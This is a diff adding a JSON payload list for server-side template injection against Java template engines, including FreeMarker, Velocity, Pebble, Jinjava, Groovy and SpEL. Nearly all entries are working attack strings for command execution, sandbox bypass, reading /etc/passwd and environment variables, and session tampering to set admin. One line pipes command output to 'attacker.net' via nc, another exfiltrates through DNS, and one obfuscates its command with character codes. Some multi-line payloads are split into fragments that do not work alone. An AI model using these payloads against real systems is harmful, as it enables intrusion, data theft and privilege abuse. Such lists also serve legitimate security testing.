@@ -1,0 +1,433 @@
+{
+    "category": "Java",
+    "keyword": "java",
+    "payloads": [
+      {
+        "type": "Basic Injection",
+        "tech": "java",
+        "payload": "${7*7}"
+      },
+      {
+        "type": "Basic Injection",
+        "tech": "java",
+        "payload": "${{7*7}}"
+      },
+      {
+        "type": "Basic Injection",
+        "tech": "java",
+        "payload": "${class.getClassLoader()}"
+      },
+      {
+        "type": "Basic Injection",
+        "tech": "java",
+        "payload": "${class.getResource(\"\").getPath()}"
+      },
+      {
+        "type": "Basic Injection",
+        "tech": "java",
+        "payload": "${class.getResource(\"../../../../../index.htm\").getContent()}"
+      },
+      {
+        "type": "Retrieve Environment Variables",
+        "tech": "java",
+        "payload": "${T(java.lang.System).getenv()}"
+      },
+      {
+        "type": "Retrieve /etc/passwd",
+        "tech": "java",
+        "payload": "${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}"
+      },
+      {
+        "type": "Retrieve /etc/passwd",
+        "tech": "java",
+        "payload": "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}"
+      },
+
+      {
+        "type": "Basic Injection",
+        "tech": "freemarker",
+        "payload": "${3*3}"
+      },
+      {
+        "type": "Basic Injection",
+        "tech": "freemarker",
+        "payload": "#{3*3}"
+      },
+      {
+        "type": "Basic Injection",
+        "tech": "freemarker",
+        "payload": "[=3*3]"
+      },
+      {
+        "type": "Read File",
+        "tech": "freemarker",
+        "payload": "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(\" \")}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "freemarker",
+        "payload": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"id\")}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "freemarker",
+        "payload": "[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "freemarker",
+        "payload": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "freemarker",
+        "payload": "#{\"freemarker.template.utility.Execute\"?new()(\"id\")}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "freemarker",
+        "payload": "[=\"freemarker.template.utility.Execute\"?new()(\"id\")]"
+      },
+      {
+        "type": "Sandbox Bypass",
+        "tech": "freemarker",
+        "payload": "<#assign classloader=article.class.protectionDomain.classLoader>"
+      },
+      {
+        "type": "Sandbox Bypass",
+        "tech": "freemarker",
+        "payload": "<#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")>"
+      },
+      {
+        "type": "Sandbox Bypass",
+        "tech": "freemarker",
+        "payload": "<#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)>"
+      },
+      {
+        "type": "Sandbox Bypass",
+        "tech": "freemarker",
+        "payload": "<#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>"
+      },
+      {
+        "type": "Sandbox Bypass",
+        "tech": "freemarker",
+        "payload": "${dwf.newInstance(ec,null)(\"id\")}"
+      },
+
+      {
+        "type": "Command Execution",
+        "tech": "codepen",
+        "payload": "- var x = root.process"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "codepen",
+        "payload": "- x = x.mainModule.require"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "codepen",
+        "payload": "- x = x('child_process')"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "codepen",
+        "payload": "= x.exec('id | nc attacker.net 80')"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "codepen",
+        "payload": "#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}"
+      },
+
+      {
+        "type": "Basic Injection",
+        "tech": "jinjava",
+        "payload": "{{'a'.toUpperCase()}}"
+      },
+      {
+        "type": "Basic Injection",
+        "tech": "jinjava",
+        "payload": "{{ request }}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "jinjava",
+        "payload": "{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "jinjava",
+        "payload": "{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "jinjava",
+        "payload": "{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "jinjava",
+        "payload": "{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}"
+      },
+
+      {
+        "type": "Basic Injection",
+        "tech": "pebble",
+        "payload": "{{ someString.toUPPERCASE() }}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "pebble",
+        "payload": "{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "pebble",
+        "payload": "{% set cmd = 'id' %}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "pebble",
+        "payload": "{% set bytes = (1).TYPE"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "pebble",
+        "payload": "     .forName('java.lang.Runtime')"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "pebble",
+        "payload": "     .methods[6]"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "pebble",
+        "payload": "     .invoke(null,null)"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "pebble",
+        "payload": "     .exec(cmd)"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "pebble",
+        "payload": "     .inputStream"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "pebble",
+        "payload": "     .readAllBytes() %}"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "pebble",
+        "payload": "{{ (1).TYPE"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "pebble",
+        "payload": "     .forName('java.lang.String')"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "pebble",
+        "payload": "     .constructors[0]"
+      },
+      {
+        "type": "Code Execution",
+        "tech": "pebble",
+        "payload": "     .newInstance(([bytes]).toArray()) }}"
+      },
+
+      {
+        "type": "Command Execution",
+        "tech": "velocity",
+        "payload": "#set($str=$class.inspect(\"java.lang.String\").type)"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "velocity",
+        "payload": "#set($chr=$class.inspect(\"java.lang.Character\").type)"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "velocity",
+        "payload": "#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"whoami\"))"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "velocity",
+        "payload": "$ex.waitFor()"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "velocity",
+        "payload": "#set($out=$ex.getInputStream())"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "velocity",
+        "payload": "#foreach($i in [1..$out.available()])"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "velocity",
+        "payload": "$str.valueOf($chr.toChars($out.read()))"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "velocity",
+        "payload": "#end"
+      },
+
+      {
+        "type": "Basic Injection",
+        "tech": "groovy",
+        "payload": "${9*9}"
+      },
+      {
+        "type": "Read File",
+        "tech": "groovy",
+        "payload": "${String x = new File('c:/windows/notepad.exe').text}"
+      },
+      {
+        "type": "Read File",
+        "tech": "groovy",
+        "payload": "${String x = new File('/path/to/file').getText('UTF-8')}"
+      },
+      {
+        "type": "Read File",
+        "tech": "groovy",
+        "payload": "${new File(\"C:\\Temp\\FileName.txt\").createNewFile();}"
+      },
+      {
+        "type": "HTTP Request",
+        "tech": "groovy",
+        "payload": "${\"http://www.google.com\".toURL().text}"
+      },
+      {
+        "type": "HTTP Request",
+        "tech": "groovy",
+        "payload": "${new URL(\"http://www.google.com\").getText()}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "groovy",
+        "payload": "${\"calc.exe\".exec()}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "groovy",
+        "payload": "${\"calc.exe\".execute()}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "groovy",
+        "payload": "${this.evaluate(\"9*9\")}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "groovy",
+        "payload": "${new org.codehaus.groovy.runtime.MethodClosure(\"calc.exe\",\"execute\").call()}"
+      },
+      {
+        "type": "Sandbox Bypass",
+        "tech": "groovy",
+        "payload": "${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"whoami\")})"
+      },
+      {
+        "type": "Sandbox Bypass",
+        "tech": "groovy",
+        "payload": "def x }"
+      },
+      {
+        "type": "Sandbox Bypass",
+        "tech": "groovy",
+        "payload": "${ new groovy.lang.GroovyClassLoader().parseClass(\"@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\")})def x\") }"
+      },
+
+      {
+        "type": "Basic Injection",
+        "tech": "spel",
+        "payload": "${7*7}"
+      },
+      {
+        "type": "Basic Injection",
+        "tech": "spel",
+        "payload": "${'patt'.toString().replace('a', 'x')}"
+      },
+      {
+        "type": "DNS Exfiltration",
+        "tech": "spel",
+        "payload": "${\"\".getClass().forName(\"java.net.InetAddress\").getMethod(\"getByName\",\"\".getClass()).invoke(\"\",\"xxxxxxxxxxxxxx.burpcollaborator.net\")}"
+      },
+      {
+        "type": "Session Attributes",
+        "tech": "spel",
+        "payload": "${pageContext.request.getSession().setAttribute(\"admin\",true)}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "spel",
+        "payload": "${T(java.lang.Runtime).getRuntime().exec(\"COMMAND_HERE\")}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "spel",
+        "payload": "#{session.setAttribute(\"rtc\",\"\".getClass().forName(\"java.lang.Runtime\").getDeclaredConstructors()[0])}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "spel",
+        "payload": "#{session.getAttribute(\"rtc\").setAccessible(true)}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "spel",
+        "payload": "#{session.getAttribute(\"rtc\").getRuntime().exec(\"/bin/bash -c whoami\")}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "spel",
+        "payload": "${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('COMMAND_HERE')}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "spel",
+        "payload": "${request.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec(\\\\\"ping x.x.x.x\\\\\")\"))}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "spel",
+        "payload": "${request.setAttribute(\"c\",\"\".getClass().forName(\"java.util.ArrayList\").newInstance())}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "spel",
+        "payload": "${request.getAttribute(\"c\").add(\"cmd.exe\")}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "spel",
+        "payload": "${request.getAttribute(\"c\").add(\"/k\")}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "spel",
+        "payload": "${request.getAttribute(\"c\").add(\"ping x.x.x.x\")}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "spel",
+        "payload": "${request.setAttribute(\"a\",\"\".getClass().forName(\"java.lang.ProcessBuilder\").getDeclaredConstructors()[0].newInstance(request.getAttribute(\"c\")).start())}"
+      },
+      {
+        "type": "Command Execution",
+        "tech": "spel",
+        "payload": "${request.getAttribute(\"a\")}"
+      }
+    ]
+}
